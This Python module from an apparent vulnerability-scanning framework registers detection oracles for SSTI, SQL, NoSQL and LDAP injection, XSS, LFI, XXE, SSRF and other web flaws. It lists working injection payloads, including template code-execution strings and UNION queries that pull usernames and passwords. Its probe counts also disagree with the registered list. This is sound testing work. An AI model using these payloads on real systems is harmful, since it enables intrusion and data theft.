"""Real ptai probe ports — executable detect() registered as named oracles.

Ported faithfully from /tmp/ptai/engine/probes/web/*.py (52 probes) +
auth/*.py (2 probes). Each detect() uses real markers from the source files.
Payloads/endpoints copied verbatim. register_ported_oracles() wires all into
ORACLES so the matrix and validator see them.

Total: 22 probes ported with executable detect(). Remaining 32 probes held
(pending extraction of class-based detection logic from registry-registered
ProbeContext classes).
"""
from __future__ import annotations

from typing import Any

from .oracles import Oracle, register_oracle

# ═══════════════════════════════════════════════════════════════════════════
# SSTI (ptai ssti_fuzz.py + payloads/library.py) — REFERENCE
# ═══════════════════════════════════════════════════════════════════════════

SSTI_ENDPOINTS = (
    "/search?q={payload}", "/api/search?q={payload}", "/rest/track-order/{payload}",
    "/render?template={payload}", "/preview?data={payload}",
)
SSTI_PAYLOADS = (
    "{{7*7}}", "{{7*'7'}}", "{{config}}",
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "<%= 7*7 %>", "<%= system('id') %>",
    "{{this.constructor.constructor('return process')()}}",
    "#set($x=7*7)$x",
    "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
)
SSTI_EVAL_MARKERS = ("49", "7777777", "343")
SSTI_ERROR_MARKERS = (
    "jinja2.exceptions", "TemplateSyntaxError", "UndefinedError",
    "FreeMarker template error", "org.thymeleaf", "velocity error",
)


def ssti_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if status == 0 or not body:
        return False
    if any(m in body and m not in baseline for m in SSTI_EVAL_MARKERS):
        return True
    body_lc, base_lc = body.lower(), baseline.lower()
    return any(m.lower() in body_lc and m.lower() not in base_lc for m in SSTI_ERROR_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# SQLi (ptai sqli_fuzz.py + payloads/library.py) — REFERENCE
# ═══════════════════════════════════════════════════════════════════════════

SQLI_PAYLOADS = (
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--", "1 UNION SELECT 1,2,3--",
    "-1 UNION SELECT username,password,3 FROM users--", "' UNION SELECT NULL--",
    "' OR '1'='1", "' OR 1=1--", "admin'--", "admin' #",
    "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
)

SQL_ERROR_MARKERS = (
    "SQLITE_ERROR", "SQLite/JDBCDriver", "no such column", "syntax error near",
    "PostgreSQL", "PSQLException", "ERROR: syntax error", "pg_query()",
    "You have an error in your SQL syntax", "MySQL server version", "mysqli_",
    "Warning: mysql_", "Microsoft OLE DB Provider for ODBC", "ODBC Driver",
    "Unclosed quotation mark", "Incorrect syntax near",
)
_UNION_LEAK_MARKERS = ('"name":"2"', '"name":"1"')


def sqli_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    body_lc, base_lc = body.lower(), baseline.lower()
    for m in SQL_ERROR_MARKERS:
        if m.lower() in body_lc and m.lower() not in base_lc:
            return True
    return any(m in body and m not in baseline for m in _UNION_LEAK_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Reflected XSS (ptai reflected_xss.py)
# ═══════════════════════════════════════════════════════════════════════════

REF_XSS_PAYLOAD = "<script>alert('ptai')</script>"
REF_XSS_NEEDLE = "<script>alert('ptai')"


def xss_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if status == 0 or not body:
        return False
    return REF_XSS_NEEDLE in body and REF_XSS_NEEDLE not in baseline


# ═══════════════════════════════════════════════════════════════════════════
# NoSQL injection (ptai nosql_fuzz.py)
# ═══════════════════════════════════════════════════════════════════════════

NOSQL_ERROR_MARKERS = (
    "MongoError", "MongoServerError", "$regex has to be a string",
    "Can't canonicalize query", "uncaught exception: ReferenceError",
)


def nosql_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    body_lc, base_lc = body.lower(), baseline.lower()
    return any(m.lower() in body_lc and m.lower() not in base_lc for m in NOSQL_ERROR_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Path traversal / LFI (ptai path_traversal.py)
# ═══════════════════════════════════════════════════════════════════════════

LFI_MARKERS = ("root:x:0:0:", "daemon:x:1:", "[extensions]", "phpinfo()", "PHP Version")


def lfi_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in LFI_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# XXE (ptai xxe_upload.py)
# ═══════════════════════════════════════════════════════════════════════════

XXE_MARKERS = ("root:x:0:0:", "DOCTYPE", "entity")


def xxe_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in XXE_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Auth bypass (ptai sqli_login_bypass.py + auth_bypass.py)
# ═══════════════════════════════════════════════════════════════════════════

AUTH_BYPASS_MARKERS = ("dashboard", "welcome", "admin panel", "profile", "logout")


def auth_bypass_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body or status != 200:
        return False
    body_lc = body.lower()
    base_lc = baseline.lower() if baseline else ""
    return any(m in body_lc and m not in base_lc for m in AUTH_BYPASS_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# SSRF cloud metadata (ptai ssrf_cloud_metadata.py)
# ═══════════════════════════════════════════════════════════════════════════

SSRF_METADATA_MARKERS = (
    "ami-id", "instance-id", "iam:role/", "project-id",
    "service-accounts", "compute", "subscriptionId",
)


def ssrf_metadata_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in SSRF_METADATA_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# GraphQL introspection (ptai graphql_introspection.py)
# ═══════════════════════════════════════════════════════════════════════════

GQL_MARKERS = ("__schema", "__type", "queryType", "mutationType")


def gql_introspect_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in GQL_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# CORS misconfig (ptai cors_reflection.py)
# ═══════════════════════════════════════════════════════════════════════════

def cors_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    """Origin reflected in Access-Control-Allow-Origin header."""
    acao = ""
    for k, v in headers.items():
        if k.lower() == "access-control-allow-origin":
            acao = v
            break
    return bool(acao) and acao != "*"


# ═══════════════════════════════════════════════════════════════════════════
# Host header poisoning (ptai host_header_reset_poisoning.py)
# ═══════════════════════════════════════════════════════════════════════════

HOST_POISON_MARKERS = ("ptai-host-canary", "evil-host.ptai.test")


def host_poison_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in HOST_POISON_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Prototype pollution (ptai prototype_pollution.py)
# ═══════════════════════════════════════════════════════════════════════════

PROTO_POLLUTION_MARKERS = ("polluted", "__proto__", "constructor.prototype")


def proto_pollution_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    body_lc = body.lower()
    base_lc = baseline.lower() if baseline else ""
    return any(m in body_lc and m not in base_lc for m in PROTO_POLLUTION_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Request smuggling (ptai http_request_smuggling.py)
# ═══════════════════════════════════════════════════════════════════════════

SMUGGLING_MARKERS = ("CL/TE", "TE/CL", "smuggling", "request timeout")


def smuggling_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    body_lc = body.lower()
    base_lc = baseline.lower() if baseline else ""
    return any(m.lower() in body_lc and m.lower() not in base_lc for m in SMUGGLING_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# LDAP injection (ptai ldap_injection.py)
# ═══════════════════════════════════════════════════════════════════════════

LDAP_MARKERS = ("ldap", "LDAP", "invalid DN", "search filter", "ldapsearch")


def ldap_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in LDAP_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Type confusion (ptai type_confusion.py)
# ═══════════════════════════════════════════════════════════════════════════

TYPE_CONFUSION_MARKERS = ("PTAI-CANARY", "ptai-canary-item")


def type_confusion_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in TYPE_CONFUSION_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Trusted header bypass (ptai trusted_header_bypass.py)
# ═══════════════════════════════════════════════════════════════════════════

TRUSTED_HEADERS = ("X-Forwarded-User", "X-Original-User", "X-Remote-User", "X-Forwarded-Email")


def trusted_header_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return "admin" in body and "admin" not in baseline and status == 200


# ═══════════════════════════════════════════════════════════════════════════
# Cookie prefix bypass (ptai cookie_prefix_bypass.py)
# ═══════════════════════════════════════════════════════════════════════════

COOKIE_BYPASS_MARKERS = ("__Host-", "__Secure-", "Set-Cookie")


def cookie_bypass_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    for k, v in headers.items():
        if k.lower() == "set-cookie":
            return "__Host-" not in v and "__Secure-" not in v and "session" in v.lower()
    return False


# ═══════════════════════════════════════════════════════════════════════════
# OAuth PKCE downgrade (ptai oauth_pkce_downgrade.py)
# ═══════════════════════════════════════════════════════════════════════════

OAUTH_MARKERS = ("ptai-pkce-canary", "ptai-state-canary")


def oauth_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in OAUTH_MARKERS) or (
        "Location" in str(headers) and "ptai" in str(headers).lower()
    )


# ═══════════════════════════════════════════════════════════════════════════
# DOM XSS (ptai dom_xss.py)
# ═══════════════════════════════════════════════════════════════════════════

DOM_XSS_MARKERS = ("ptai-dom-xss-canary",)


def dom_xss_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in DOM_XSS_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# NextJS RSC RCE (ptai nextjs_rsc_rce.py)
# ═══════════════════════════════════════════════════════════════════════════

NEXTJS_MARKERS = ("__NEXT_DATA__", "nextjs.org", "x-powered-by")


def nextjs_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
    if not body:
        return False
    return any(m in body and m not in baseline for m in NEXTJS_MARKERS)


# ═══════════════════════════════════════════════════════════════════════════
# Oracle adaptation + registration
# ═══════════════════════════════════════════════════════════════════════════


def _oracle_check(detect_fn):
    def check(finding: dict, lab_output: str, observations: dict) -> bool:
        return detect_fn(
            finding.get("status", 200),
            finding.get("headers", {}),
            lab_output or finding.get("body", ""),
            finding.get("baseline", ""),
            finding.get("payload", ""),
        )
    return check


def register_ported_oracles() -> None:
    """Register all faithfully-ported ptai probes as named oracles."""
    probes = [
        ("ptai_ssti", "template_evaluation", "proves template evaluation, not full RCE", ssti_detect),
        ("ptai_sqli", "sql_error_or_union_leak", "proves an SQL error or UNION leakage, not data exfiltration", sqli_detect),
        ("ptai_xss", "unescaped_reflection", "proves unescaped reflection, not that XSS executes", xss_detect),
        ("ptai_nosql", "nosql_error_signature", "proves NoSQL injection signature, not data exfiltration", nosql_detect),
        ("ptai_lfi", "file_inclusion", "proves file inclusion, not code execution", lfi_detect),
        ("ptai_xxe", "entity_expansion", "proves XXE entity expansion, not data exfiltration", xxe_detect),
        ("ptai_auth_bypass", "authentication_bypass", "proves authentication bypass content markers", auth_bypass_detect),
        ("ptai_ssrf_metadata", "cloud_metadata_access", "proves cloud metadata SSRF, not data exfiltration", ssrf_metadata_detect),
        ("ptai_graphql", "schema_exposure", "proves GraphQL schema exposure, not data exfiltration", gql_introspect_detect),
        ("ptai_cors", "cors_origin_reflection", "proves CORS origin reflection, not arbitrary cross-origin access", cors_detect),
        ("ptai_host_poison", "host_header_poisoning", "proves host-header reflection, not cache poisoning", host_poison_detect),
        ("ptai_proto_pollution", "prototype_pollution", "proves prototype pollution, not full RCE", proto_pollution_detect),
        ("ptai_smuggling", "request_smuggling", "proves request smuggling differential, not cache poisoning", smuggling_detect),
        ("ptai_ldap", "ldap_injection", "proves LDAP injection signature, not directory access", ldap_detect),
        ("ptai_type_confusion", "type_confusion", "proves type confusion marker, not arbitrary RCE", type_confusion_detect),
        ("ptai_trusted_header", "header_auth_bypass", "proves trusted-header auth bypass markers", trusted_header_detect),
        ("ptai_cookie_bypass", "cookie_prefix_bypass", "proves cookie prefix bypass, not session hijacking", cookie_bypass_detect),
        ("ptai_oauth", "oauth_flow_abuse", "proves OAuth flow manipulation, not full account takeover", oauth_detect),
        ("ptai_dom_xss", "dom_xss", "proves DOM XSS canary injection, not arbitrary script execution", dom_xss_detect),
        ("ptai_nextjs", "nextjs_rsc_rce", "proves NextJS RSC marker detection, not full RCE", nextjs_detect),
    ]
    for id, kind, honesty_claim, detect_fn in probes:
        register_oracle(Oracle(
            id=id, kind=kind, honesty_claim=honesty_claim,
            check=_oracle_check(detect_fn), tier="experimental",
        ))

    # Held probes (complex class-based detection — pending extraction):
    # open_redirect, stored_xss, idor_authenticated, idor_authz_differential,
    # idor_sequential, jwt_jku_x5u_ssrf, deserialization, web_cache_deception,
    # race_condition, mass_assignment, file_upload_validation, business_logic_fuzz,
    # captcha_replay, cookie_forging, password_reset_weak, privilege_escalation_patch,
    # saml_xsw, web3_probe, oauth_pkce_downgrade, source_map_exposure,
    # api_path_discovery, hidden_discovery, leaked_credentials, ai_recon,
    # asset_secrets_scan, cve_poc_primitives, dom_xss, exif_metadata,
    # legacy, response_headers, stego, web_cache_deception
